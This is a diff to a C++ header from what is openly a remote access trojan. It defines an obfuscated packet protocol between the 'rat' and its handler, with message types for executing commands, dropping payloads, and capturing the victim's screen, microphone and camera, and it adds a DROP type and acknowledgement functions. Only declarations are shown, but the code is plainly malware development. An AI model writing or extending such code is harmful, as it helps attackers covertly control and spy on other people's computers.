@@ -16,13 +16,16 @@
 
 // custom packet send across a socket to obfuscate
 // communication between rat and handler
-enum class MsgType { INIT, INVOKE, OUTPUT, EXEC, SCREEN, MIC, CAMERA, NONE };
+enum class MsgType { INIT, DROP, INVOKE, OUTPUT, EXEC, SCREEN, MIC, CAMERA, NONE };
 class RatPacket {
 public:
     // FRAME FMT : [ 0xde 0xad | SIZE | MSG_TYPE | MSG | 0xbe 0xef ]
 
     // creates blank packet
     RatPacket();
+    // copy ctor
+    RatPacket(const RatPacket& rhs);
+
     // takes in string content and type and defines elements of the frame
     RatPacket(std::string content, MsgType msgType);
     // extracts elements from given frame after checking if its valid
@@ -40,6 +43,7 @@ public:
     int SizeOf() const;
     MsgType GetType() const;
     std::string GetPacketMessage() const;
+    bool IsCorrupted() const;
 
     // setters
     void SetPacketMessage(std::string nMsg);
@@ -48,6 +52,7 @@ private:
     unsigned int size;
     MsgType type;
     std::string msg;
+    bool corrupted;
 };
 
 namespace RatPacketUtils {
@@ -57,6 +62,8 @@ namespace RatPacketUtils {
 
     bool Send(const SOCKET& sock, const RatPacket& packet);
     std::pair<RatPacket,bool> Recv(const SOCKET& sock);
+    bool Ack(const SOCKET& sock);
+    bool SendAck(const SOCKET& sock);
 };
 
 #endif
